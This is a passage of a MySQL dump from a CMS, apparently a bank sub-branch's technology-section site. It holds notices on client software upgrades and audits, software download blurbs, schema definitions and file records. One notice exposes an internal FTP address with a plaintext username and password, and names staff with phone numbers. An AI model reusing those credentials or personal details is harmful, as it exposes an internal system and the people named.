联系电话：0873-3710218</p><p>&nbsp; &nbsp; 手&nbsp; &nbsp; 机：13808772547</p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 红河中支科技科</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2017年3月2日</p><p><br/></p>', null, null, null), ('181', '<p>各支行：</p><p>&nbsp; &nbsp; 按照中支机关要求，对审计中（包括内部检查和交叉检查）科技部分存在的问题进行统计，中支机关将收集进行整理，建立项目储备库，待条件允许将安排进行整改。各单位请参照2016版信息安全规范县支行版进行自查。请于27日邮件报送至黄锦，孟干邮箱。</p><p>&nbsp; &nbsp; 附件：2016版信息安全规范</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 红河中支科技科</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2017.2.24</p><p><br/></p>', null, null, null), ('182', '<p>按照上级工作安排，科技科按照安排完成2016年公文结转工作，顺利完成工作安排</p>', null, null, null), ('183', '<p><br/></p><p>各县（市）支行：</p><p><br/></p><p>&nbsp; &nbsp; 人民银行昆明中心支行定于2016年12月8日下午15:00，召开云南省移动金融和金融IC卡多应用经验交流视频会议，具体会议通知详见附件，请各县市支行做好会议的调试及组织工作。</p><p><br/></p>', null, null, null), ('184', '<p>各县（市）区支行：</p><p><br/></p><p>&nbsp; &nbsp; 根据总行工作安排，定于2016年11月25日（本周五）晚上进行TCBS系统升级。请各单位按以下要求组织完成相关工作：</p><p><br/></p><p>&nbsp; &nbsp; 一、TCBS新客户端安装事项</p><p><br/></p><p>&nbsp; &nbsp; 请各单位在备份TCBS原有客户端的基础上，于11月25日全部业务结束后安装本辖区各级国库TCBS新客户端，待安装完成后，11月26日配合国库业务人员验证是否可以正常登录系统。</p><p><br/></p><p>&nbsp; &nbsp;二、TCBS新客户端验证事项</p><p><br/></p><p>&nbsp; &nbsp; 安装完成TCBS新客户端后，配合国库业务人员验证是否可以在生产环境新客户端进行正常登录系统及查询打印。</p><p><br/></p><p>&nbsp; &nbsp; 三、TCBS新客户端下载事项</p><p>&nbsp; &nbsp; &nbsp;中支FTP，ftp://11.78.113.70</p><p>&nbsp; &nbsp; &nbsp;用户名：hhzrh</p><p>&nbsp; &nbsp; &nbsp;密码：hhzrh</p><p>&nbsp; &nbsp; &nbsp;文件目录：1、GK国库\\TCBS客户端软件\\20161125\\生产20161125.rar</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2、GK国库\\TCBS客户端软件\\20161125\\灾备20161125.rar</p><p>&nbsp; &nbsp;&nbsp;</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp; 四、实施注意事项</p><p><br/></p><p>&nbsp; &nbsp; （一）请各单位高度重视、合理安排，并事先与国库部门做好沟通工作。</p><p><br/></p><p>&nbsp; &nbsp; （二）请各单位认真组织客户端安装实施，要有相应的应急回退保障措施。</p><p><br/></p><p>&nbsp; &nbsp; （三）在实施工作完成后密切观察业务办理是否正常，并于11月29日16：00之前将具体实施情况（需要明确辖内完成升级验证的客户端数量）通过业务网邮件发送至联系人。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;联系人：杜云&nbsp; &nbsp; 0873-3710218</p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2016.11.25</p><p><br/></p>', null, null, null), ('185', '<p><br/></p><p><br/></p><p>各县（市）支行：</p><p><br/></p><p>&nbsp; &nbsp; 按照总行工作安排，TMIS全国版系统（统计分析子系统、基础信息子系统、现金管理子系统）计划于11月21日下午进行升级，11月22日开始启用新版客户端（TMIS国债子系统客户端不变）。请各单位按以下要求组织完成相关工作：</p><p><br/></p><p>&nbsp; &nbsp; 一、TMIS客户端软件安装事项</p><p><br/></p><p>&nbsp; &nbsp; 请各单位协调好国库部门人员，按附件1的配置指引安装相应的客户端软件。</p><p><br/></p><p>&nbsp; &nbsp; 二、客户端下载事项</p><p><br/></p><p>&nbsp; &nbsp; TMIS全国版客户端程序“tmis-20161012（统计分析-基础信息-现金管理）.zip”已上传至红河中支FTP，地址为：ftp://11.78.113.70,位于“20161117国库客户端”目录下，名称为：201611161532892991.zip，另一个文件为“TMIS全国版客户端配置指引20161012.doc”。请各单位下载后安装实施。</p><p><br/></p><p>&nbsp; &nbsp; 三、实施注意事项</p><p><br/></p><p>&nbsp; &nbsp; （一）请各单位认真组织客户端安装实施，要有相应的应急回退保障措施，并与国库部门做好沟通工作。</p><p><br/></p><p>&nbsp; &nbsp; （二）在实施工作完成后密切观察业务办理是否正常，并于11月22日12：00前将辖内实施的客户端数量和实施情况通过微信群发送出来报张永清科长。</p><p><br/></p><p><br/></p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 红河中支科技科</p><p><br/></p>', null, null, null), ('186', '<p><span style=\"color: rgb(102, 102, 102); font-family: arial, &quot;Microsoft YaHei&quot;, 微软雅黑; font-size: 12px; background-color: rgb(255, 255, 255);\">360浏览器是互联网上最好用、最安全的新一代浏览器，和360安全卫士、360杀毒等软件等产品一同成为360安全中心的系列产品。木马已经取代病毒成为当前互联网上最大的威胁，90%的木马用挂马网站通过普通浏览器入侵，每天有200万用户访问挂马网站中毒。360安全浏览器拥有全国最大的恶意网址库，采用恶意网址拦截技术，可自动拦截挂马、欺诈、网银仿冒等恶意网址。独创沙箱技术，在隔离模式即使访问木马也不会感染。除了在安全方面的特性，360安全浏览器在速度、资源占用、防假死不崩溃等基础特性上表现同样优异，在功能方面拥有翻译、截图、鼠标手势、广告过滤等几十种实用功能，在外观上设计典雅精致，是外观设计最好的浏览器，已成为广大网民使用浏览器的第一选择。</span></p>', null, null, null), ('187', '<p><span style=\"color: rgb(51, 51, 51); font-family: arial, \" microsoft=\"\" font-size:=\"\" background-color:=\"\">爱奇艺影音 6.6</span></p>', null, null, null), ('188', '<p><img src=\"/honghe/u/cms/www/201810/22182326859a.jpg\" width=\"120\" height=\"90\" alt=\"PP助手 5.9.7\" style=\"border: 0px; display: block; float: left; margin: 6px 20px 10px 0px; color: rgb(102, 102, 102); font-family: arial, \" microsoft=\"\" font-size:=\"\" white-space:=\"\" background-color:=\"\"/><span style=\"color: rgb(102, 102, 102); font-family: arial, \" microsoft=\"\" font-size:=\"\" background-color:=\"\">PP助手是一款同时支持iOS及Android设备的软件、游戏、壁纸、铃声资源的下载安装和资源管理工具。它具有界面清爽、操作流畅、下载飞速、资源海量等优势。作为国内领先的应用分发平台，PP助手同时支持iPhone、iPad、iTouch、Mac等iOS及Android设备的软件、游戏、壁纸、铃声资源的下载安装和管理。与同类软件相比，它具有界面清爽、操作流畅、下载飞速、资源海量等优势。</span></p>', null, null, null), ('189', '<h1 style=\"margin: 0px; padding: 0px; display: inline-block; color: rgb(51, 51, 51); font-family: arial, &quot;Microsoft YaHei&quot;, 微软雅黑; background-color: rgb(255, 255, 255);\"><label style=\"display: block; margin-right: 8px; float: left; max-width: 450px; height: 40px; overflow: hidden; font-variant-numeric: normal; font-variant-east-asian: normal; font-weight: normal; font-stretch: normal; font-size: 22px; line-height: 38px; word-break: break-all;\">QQ同步助手电脑版</label></h1><p><span class=\"official-icon\" style=\"width: 40px; height: 18px; background-color: rgb(0, 142, 225); font-size: 12px; color: rgb(255, 255, 255); line-height: 18px; text-align: center; display: inline-block; vertical-align: top; margin: 9px 8px 0px 10px; font-family: arial, &quot;Microsoft YaHei&quot;, 微软雅黑;\"></span></p><p><br/></p>', null, null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_content_type`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_type`;
CREATE TABLE `jc_content_type` (
  `type_id` int(11) NOT NULL,
  `type_name` varchar(20) NOT NULL COMMENT '名称',
  `img_width` int(11) DEFAULT NULL COMMENT '图片宽',
  `img_height` int(11) DEFAULT NULL COMMENT '图片高',
  `has_image` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有图片',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`type_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容类型表';

-- ----------------------------
--  Records of `jc_content_type`
-- ----------------------------
BEGIN;
INSERT INTO `jc_content_type` VALUES ('1', '普通', '100', '100', '0', '0'), ('2', '图文', '510', '288', '1', '0'), ('3', '焦点', '280', '200', '1', '0'), ('4', '头条', '0', '0', '0', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_contenttag`
-- ----------------------------
DROP TABLE IF EXISTS `jc_contenttag`;
CREATE TABLE `jc_contenttag` (
  `content_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  KEY `fk_jc_content_tag` (`tag_id`),
  KEY `fk_jc_tag_content` (`content_id`),
  CONSTRAINT `fk_jc_content_tag` FOREIGN KEY (`tag_id`) REFERENCES `jc_content_tag` (`tag_id`),
  CONSTRAINT `fk_jc_tag_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容标签关联表';

-- ----------------------------
--  Records of `jc_contenttag`
-- ----------------------------
BEGIN;
INSERT INTO `jc_contenttag` VALUES ('142', '1', '0'), ('142', '2', '1'), ('142', '3', '2'), ('143', '1', '0'), ('143', '2', '1'), ('143', '4', '2'), ('144', '1', '0'), ('144', '2', '1'), ('144', '5', '2'), ('147', '26', '0'), ('147', '27', '1'), ('147', '28', '2'), ('148', '33', '0'), ('148', '34', '1'), ('148', '35', '2'), ('149', '42', '0'), ('149', '43', '1'), ('149', '44', '2'), ('150', '8', '0'), ('150', '9', '1'), ('150', '2', '2'), ('151', '8', '0'), ('151', '9', '1'), ('151', '10', '2'), ('152', '11', '0'), ('153', '9', '0'), ('153', '10', '1'), ('154', '12', '0'), ('155', '13', '0'), ('156', '14', '0'), ('157', '1', '0'), ('159', '8', '0'), ('159', '9', '1'), ('159', '15', '2'), ('159', '2', '3'), ('159', '10', '4'), ('160', '2', '0'), ('160', '16', '1'), ('161', '2', '0'), ('161', '16', '1'), ('161', '4', '2'), ('162', '2', '0'), ('162', '16', '1'), ('162', '17', '2'), ('163', '18', '0'), ('163', '19', '1'), ('163', '3', '2'), ('164', '18', '0'), ('164', '19', '1'), ('164', '4', '2'), ('165', '18', '0'), ('165', '19', '1'), ('165', '5', '2'), ('166', '18', '0'), ('166', '19', '1'), ('166', '20', '2'), ('167', '18', '0'), ('167', '19', '1'), ('167', '21', '2'), ('168', '18', '0'), ('168', '19', '1'), ('168', '22', '2'), ('169', '18', '0'), ('169', '19', '1'), ('169', '23', '2'), ('170', '18', '0'), ('170', '19', '1'), ('170', '24', '2'), ('171', '18', '0'), ('171', '19', '1'), ('171', '25', '2'), ('147', '29', '3'), ('147', '30', '4'), ('147', '31', '5'), ('147', '32', '6'), ('148', '36', '3'), ('148', '37', '4'), ('148', '38', '5'), ('148', '39', '6'), ('148', '40', '7'), ('149', '45', '3'), ('149', '46', '4'), ('149', '47', '5'), ('149', '48', '6'), ('149', '49', '7'), ('149', '21', '8'), ('149', '50', '9'), ('149', '51', '10'), ('149', '52', '11'), ('149', '53', '12'), ('149', '54', '13'), ('149', '43', '14'), ('173', '55', '0'), ('173', '56', '1'), ('173', '57', '2'), ('173', '58', '3'), ('173', '59', '4'), ('173', '60', '5'), ('173', '61', '6'), ('173', '62', '7'), ('173', '63', '8'), ('173', '64', '9'), ('173', '65', '10'), ('173', '66', '11'), ('173', '67', '12'), ('173', '68', '13'), ('173', '69', '14'), ('174', '70', '0'), ('174', '56', '1'), ('174', '57', '2'), ('174', '64', '3'), ('174', '65', '4'), ('174', '66', '5'), ('174', '71', '6'), ('174', '68', '7'), ('174', '72', '8'), ('174', '73', '9'), ('174', '74', '10'), ('174', '60', '11'), ('174', '75', '12'), ('174', '76', '13'), ('174', '77', '14'), ('175', '78', '0'), ('175', '56', '1'), ('175', '58', '2'), ('175', '59', '3'), ('175', '60', '4'), ('175', '61', '5'), ('175', '62', '6'), ('175', '63', '7'), ('175', '64', '8'), ('175', '65', '9'), ('175', '66', '10'), ('175', '71', '11'), ('175', '68', '12'), ('175', '79', '13'), ('175', '80', '14'), ('176', '81', '0'), ('176', '82', '1'), ('176', '56', '2'), ('176', '83', '3'), ('176', '84', '4'), ('176', '85', '5'), ('176', '86', '6'), ('176', '58', '7'), ('176', '65', '8'), ('176', '67', '9'), ('176', '87', '10'), ('177', '55', '0'), ('177', '56', '1'), ('177', '88', '2'), ('177', '59', '3'), ('177', '63', '4'), ('177', '89', '5'), ('177', '90', '6'), ('177', '91', '7'), ('177', '59', '8'), ('177', '92', '9'), ('178', '82', '0'), ('178', '56', '1'), ('178', '93', '2'), ('178', '88', '3'), ('178', '94', '4'), ('178', '85', '5'), ('178', '86', '6'), ('178', '57', '7'), ('178', '95', '8'), ('178', '65', '9'), ('178', '66', '10'), ('178', '67', '11'), ('178', '68', '12'), ('178', '69', '13'), ('179', '55', '0'), ('179', '56', '1'), ('179', '88', '2'), ('179', '59', '3'), ('179', '63', '4'), ('179', '89', '5'), ('179', '90', '6'), ('179', '91', '7'), ('179', '59', '8'), ('179', '92', '9'), ('180', '96', '0'), ('180', '97', '1'), ('180', '98', '2'), ('180', '99', '3'), ('180', '100', '4'), ('180', '66', '5'), ('180', '101', '6'), ('180', '59', '7'), ('180', '102', '8'), ('180', '103', '9'), ('180', '104', '10'), ('180', '15', '11'), ('180', '105', '12'), ('180', '106', '13'), ('181', '96', '0'), ('181', '107', '1'), ('181', '56', '2'), ('181', '108', '3'), ('181', '109', '4'), ('181', '110', '5'), ('181', '111', '6'), ('181', '112', '7'), ('181', '15', '8'), ('181', '113', '9'), ('181', '15', '10'), ('181', '105', '11'), ('182', '114', '0'), ('182', '115', '1'), ('182', '116', '2'), ('182', '117', '3'), ('182', '118', '4'), ('183', '96', '0'), ('183', '119', '1'), ('183', '120', '2'), ('183', '121', '3'), ('183', '75', '4'), ('183', '61', '5'), ('183', '75', '6'), ('183', '122', '7'), ('183', '123', '8'), ('183', '124', '9'), ('183', '125', '10'), ('183', '126', '11'), ('183', '127', '12'), ('183', '15', '13'), ('183', '105', '14'), ('184', '96', '0'), ('184', '128', '1'), ('184', '129', '2'), ('184', '130', '3'), ('184', '131', '4'), ('184', '15', '5'), ('184', '105', '6'), ('184', '106', '7'), ('185', '96', '0'), ('185', '57', '1'), ('185', '132', '2'), ('185', '130', '3'), ('185', '133', '4'), ('185', '134', '5'), ('185', '131', '6'), ('185', '15', '7'), ('185', '105', '8');
COMMIT;

-- ----------------------------
--  Table structure for `jc_department`
-- ----------------------------
DROP TABLE IF EXISTS `jc_department`;
CREATE TABLE `jc_department` (
  `depart_id` int(11) NOT NULL AUTO_INCREMENT,
  `depart_name` varchar(255) NOT NULL DEFAULT '' COMMENT '部门名称',
  `site_id` int(11) DEFAULT '0' COMMENT '站点',
  `priority` int(11) NOT NULL DEFAULT '1' COMMENT '排序',
  `weights` int(11) NOT NULL DEFAULT '1' COMMENT '权重(值越大，级别越高)',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级部门ID',
  PRIMARY KEY (`depart_id`),
  KEY `fk_jc_department_site` (`site_id`),
  KEY `fk_jc_jc_department_parent` (`parent_id`),
  CONSTRAINT `fk_jc_jc_department_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_department` (`depart_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='部门';

-- ----------------------------
--  Records of `jc_department`
-- ----------------------------
BEGIN;
INSERT INTO `jc_department` VALUES ('1', '中支', null, '1', '1', null), ('2', '科技科', null, '2', '1', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_dictionary`
-- ----------------------------
DROP TABLE IF EXISTS `jc_dictionary`;
CREATE TABLE `jc_dictionary` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT 'name',
  `value` varchar(255) NOT NULL COMMENT 'value',
  `type` varchar(255) NOT NULL COMMENT 'type',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='字典表';

-- ----------------------------
--  Records of `jc_dictionary`
-- ----------------------------
BEGIN;
INSERT INTO `jc_dictionary` VALUES ('1', '10-20人', '10-20人', 'scale'), ('2', '20-50人', '20-50人', 'scale'), ('3', '50-10人', '50-10人', 'scale'), ('4', '100人以上', '100人以上', 'scale'), ('5', '私企', '私企', 'nature'), ('6', '股份制', '股份制', 'nature'), ('7', '国企', '国企', 'nature'), ('8', '互联网', '互联网', 'industry'), ('9', '房地产', '房地产', 'industry'), ('10', '加工制造', '加工制造', 'industry'), ('11', '服务行业', '服务行业', 'industry');
COMMIT;

-- ----------------------------
--  Table structure for `jc_directive_tpl`
-- ----------------------------
DROP TABLE IF EXISTS `jc_directive_tpl`;
CREATE TABLE `jc_directive_tpl` (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '标签名称',
  `description` varchar(1000) DEFAULT NULL COMMENT '标签描述',
  `code` text COMMENT '标签代码',
  `user_id` int(11) NOT NULL COMMENT '标签创建者',
  PRIMARY KEY (`tpl_id`),
  KEY `fk_jc_directive_tpl_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FComment';

-- ----------------------------
--  Table structure for `jc_file`
-- ----------------------------
DROP TABLE IF EXISTS `jc_file`;
CREATE TABLE `jc_file` (
  `file_path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `file_name` varchar(255) DEFAULT '' COMMENT '文件名字',
  `file_isvalid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有效',
  `content_id` int(11) DEFAULT NULL COMMENT '内容id',
  PRIMARY KEY (`file_path`),
  KEY `fk_jc_file_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `jc_file`
-- ----------------------------
BEGIN;
INSERT INTO `jc_file` VALUES ('/honghe/u/cms/www/201810/2122552437xw.jpg', '7c0a389d-5c93-4a2b-a325-5ae8b614f7c8_CD12192AF8924F53B4E8AF45C6B8447626190338_w1024_h471.jpg', '1', '163'), ('/honghe/u/cms/www/201810/21225540cafl.jpg', '19142227i3ee.jpg', '1', '164'), ('/honghe/u/cms/www/201810/21230045m1jk.jpg', '1123588013_15400222036111n.jpg', '1', '167'), ('/honghe/u/cms/www/201810/21230435i3lq.jpg', '4befde6a302e63388e5d1e4185c532ef.jpg', '1', '171'), ('/honghe/u/cms/www/201810/22172819poyd.jpg', 'fcfaaf51f3deb48f22c743bdfd1f3a292df57823.jpg', '1', '147'), ('/honghe/u/cms/www/201810/22180404a07f.jpg', '18d8bc3eb13533fa480b7e4da5d3fd1f41345b10.jpg', '1', '173'), ('/honghe/u/cms/www/201810/22180614d86s.jpg', '3801213fb80e7bec02012a85222eb9389a506bfe.jpg', '1', '182'), ('/honghe/u/cms/www/201810/22180659w694.jpg', 'fcfaaf51f3deb48f22c743bdfd1f3a292df57823.jpg', '1', '181'), ('/honghe/u/cms/www/201810/22182016h9m0.exe', 'FeiQ.1060559168.exe', '0', null), ('/honghe/u/cms/www/201810/22182118gmvc.exe', '360.exe', '1', '186'), ('/honghe/u/cms/www/201810/22182609rm2k.zip', 'ssh_dao-1.0-SNAPSHOT.zip', '1', '188'), ('/honghe/u/cms/www/201810/22182636x5u6.zip', 'ssh_dao-1.0-SNAPSHOT.zip', '1', '187'), ('/honghe/u/cms/www/201810/22182713b0tb.zip', 'ssh_dao-1.0-SNAPSHOT.zip', '1', '189'), ('/u/cms/www/201607/19141205t5d9.jpg', 'MAIN201607190815465375224112529.jpg', '0', null), ('/u/cms/www/201608/30174757ffr0.jpg', '255901999.jpg', '0', null), ('/u/cms/www/201609/13103353l0rl.png', 'small-prev-page-on.png', '0', null), ('/u/cms/www/201609/131035049a54.png', 'm-sj.png', '0', null), ('/u/cms/www/201609/13103723gjne.png', 'small-prev-page-on.png', '0', null), ('/u/cms/www/201609/13103724lwp5.png', 'small-next-page.png', '0', null), ('/u/cms/www/201609/13103724wi3l.png', 'small-next-page-on.png', '0', null), ('/u/cms/www/201609/1310372501bw.png', 'small-prev-page.png', '0', null), ('/u/cms/www/201609/13103813zfv9.png', 'member-nav.png', '0', null), ('/u/cms/www/201609/13103824db3u.png', 'm-sj.png', '0', null), ('/u/cms/www/201609/19152319tjq4.png', 'zsr.png', '0', null), ('/u/cms/www/201609/19152412hzzi.png', 'zsr.png', '0', null), ('/u/cms/www/201609/191535032l85.png', 'zhye.png', '0', null), ('/u/cms/www/201609/19153503qjwl.png', 'zsr.png', '0', null), ('/u/cms/www/201609/19153920h4eu.png', 'zhye.png', '0', null), ('/u/cms/www/201609/19154055s1o7.png', 'zhye.png', '0', null), ('/u/cms/www/201609/191544366efu.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19154641z4av.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/191547450q92.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19154854sed0.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19155012rfja.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19155535g178.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/191556168oxh.png', 'zhye.png', '0', null), ('/u/cms/www/201609/191557592avc.png', 'zsr.png', '0', null), ('/u/cms/www/201609/19155839xtw8.png', 'zhye.png', '0', null), ('/u/cms/www/201609/191559127g8a.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19155948ohk3.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/191601382uqh.png', 'txsj.png', '0', null), ('/u/cms/www/201609/19160214xqcz.png', 'gmcs.png', '0', null), ('/u/cms/www/201609/19160256yti4.png', 'txcs.png', '0', null), ('/u/cms/www/201609/23100710845n.jpg', 'sf.jpg', '0', null), ('/u/cms/www/201609/270953566xxw.jpg', 'content-bdy.jpg', '0', null), ('/u/cms/www/201609/27095528bd43.jpg', 'download02.jpg', '0', null), ('/u/cms/www/201610/08153906dmjk.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/081540214khn.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/08154224b4zl.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/08155845dhts.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/08160110rjjx.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/081602097gfq.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/08162230t0wf.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/08162651u5t0.jpg', 'wenku_item05.jpg', '0', null), ('/u/cms/www/201610/10100842hqdk.jpg', 'topic_title03.jpg', '1', null), ('/u/cms/www/201610/10100850mssf.jpg', 'topic03.jpg', '0', null), ('/u/cms/www/201610/10100951y2xy.jpg', 'topic_title02.jpg', '1', null), ('/u/cms/www/201610/1010095517rc.jpg', 'topic02.jpg', '0', null), ('/u/cms/www/201610/101010021q7v.jpg', 'topic_title01.jpg', '1', null), ('/u/cms/www/201610/10101006fqv3.jpg', 'topic01.jpg', '0', null), ('/u/cms/www/201610/101317064t3l.jpg', 'xZ.jpg', '0', null), ('/u/cms/www/201610/110911592mxa.jpg', 'hlwjia.jpg', '1', null), ('/u/cms/www/201610/110919049wkh.jpg', 'qglh.jpg', '0', null), ('/u/cms/www/201610/11092148co74.jpg', 'qglh.jpg', '1', null), ('/u/cms/www/201610/11092540p27t.jpg', 'zph.jpg', '1', null), ('/u/cms/www/201610/11092701sxi4.jpg', 'zph.jpg', '0', null), ('/u/cms/www/201610/11111659rnpb.mp4', '/u/cms/www/201610/11111659rnpb.mp4', '0', null), ('/u/cms/www/201610/11111729glis.docx', '测试.docx', '0', null), ('/u/cms/www/201610/11111806t1hj.mp4', '/u/cms/www/201610/11111806t1hj.mp4', '0', null), ('/u/cms/www/201610/111118456g3w.docx', '测试.docx', '0', null), ('/u/cms/www/201610/111118588poy.mp4', '/u/cms/www/201610/111118588poy.mp4', '0', null), ('/u/cms/www/201610/11112051yx2x.mp4', '/u/cms/www/201610/11112051yx2x.mp4', '0', null), ('/u/cms/www/201610/111121133pnh.mp4', '/u/cms/www/201610/111121133pnh.mp4', '0', null), ('/u/cms/www/201610/111121213xss.docx', '测试.docx', '0', null), ('/u/cms/www/201610/11112910l4qa.jpg', '3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg', '0', null), ('/u/cms/www/201610/11113157dh9e.jpg', '0.jpg', '0', null), ('/u/cms/www/201810/18224550pmrm.json', 'package.json', '0', null), ('/u/cms/www/201810/18224616n4ar.pdf', '阿里巴巴Java开发手册(终极版).pdf', '1', '145'), ('/u/cms/www/201810/18224649ymwj.rar', 'fq.rar', '1', '146'), ('/u/cms/www/22093458gynd.jpg', '22093458gynd.jpg', '1', null), ('/u/cms/www/22093502mmft.jpg', '22093502mmft.jpg', '1', null), ('/u/cms/www/22093506l8pv.jpg', '22093506l8pv.jpg', '1', null), ('/u/cms/www/22093509qm3l.jpg', '22093509qm3l.jpg', '1', null), ('/u/cms/www/22093513srmf.jpg', '22093513srmf.jpg', '1', null), ('/u/cms/www/22094752xoxd.jpg', '22094752xoxd.jpg', '1', null), ('/u/cms/www/22094906lrj8.jpg', '22094906lrj8.jpg', '1', null), ('/u/cms/www/22094911xe9x.jpg', '22094911xe9x.jpg', '1', null), ('/u/cms/www/22094915t8h1.jpg', '22094915t8h1.jpg', '1', null), ('/u/cms/www/22094918gnze.jpg', '22094918gnze.jpg', '1', null), ('/u/cms/www/22100555lytj.jpg', '22100555lytj.jpg', '1', null), ('/u/cms/www/22100558gfsb.jpg', '22100558gfsb.jpg', '1', null), ('/u/cms/www/22100601l1us.jpg', '22100601l1us.jpg', '1', null), ('/u/cms/www/22100606t8mw.jpg', '22100606t8mw.jpg', '1', null), ('/u/cms/www/22100611o2gl.jpg', '22100611o2gl.jpg', '1', null), ('/u/cms/www/23172935t4sb.jpg', '23172935t4sb.jpg', '1', null), ('/u/cms/www/23172936acob.jpg', '23172936acob.jpg', '1', null), ('/u/cms/www/23172937bli1.jpg', '23172937bli1.jpg', '1', null), ('/u/cms/www/23172937r23n.jpg', '23172937r23n.jpg', '1', null), ('/u/cms/www/23172939ln5a.jpg', '23172939ln5a.jpg', '1', null), ('/u/cms/www/231729407e1v.jpg', '231729407e1v.jpg', '1', null), ('/u/cms/www/231729434x7h.jpg', '231729434x7h.jpg', '1', null), ('/u/cms/www/23172944o38x.jpg', '23172944o38x.jpg', '1', null), ('/u/cms/www/23172944vvdh.jpg', '23172944vvdh.jpg', '1', null), ('/u/cms/www/23172946mzqx.jpg', '23172946mzqx.jpg', '1', null), ('/u/cms/www/23172947nrrl.jpg', '23172947nrrl.jpg', '1', null), ('/u/cms/www/24102446b7al.jpg', '24102446b7al.jpg', '1', null), ('/u/cms/www/24102503z9wj.jpg', '24102503z9wj.jpg', '1', null), ('/u/cms/www/2416455972ro.jpg', '2416455972ro.jpg', '1', null), ('/u/cms/www/241646340nq6.jpg', '241646340nq6.jpg', '1', null), ('/u/cms/www/24164707ksjq.jpg', '24164707ksjq.jpg', '1', null), ('/u/cms/www/26115537aper.jpg', '26115537aper.jpg', '1', null), ('/u/cms/www/26115537rs0f.jpg', '26115537rs0f.jpg', '1', null), ('/u/cms/www/26150136kryi.txt', '26150136kryi.txt', '1', null), ('/u/cms/www/Thumbs.db', 'Thumbs.db', '1', null), ('/v6/u/cms/www/201401/13135536pnt2.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/131359296e9c.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/1314055350gc.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/13140606bjte.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/13140635xydz.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/13140702pfne.jpg', 'mv1.jpg', '0', null), 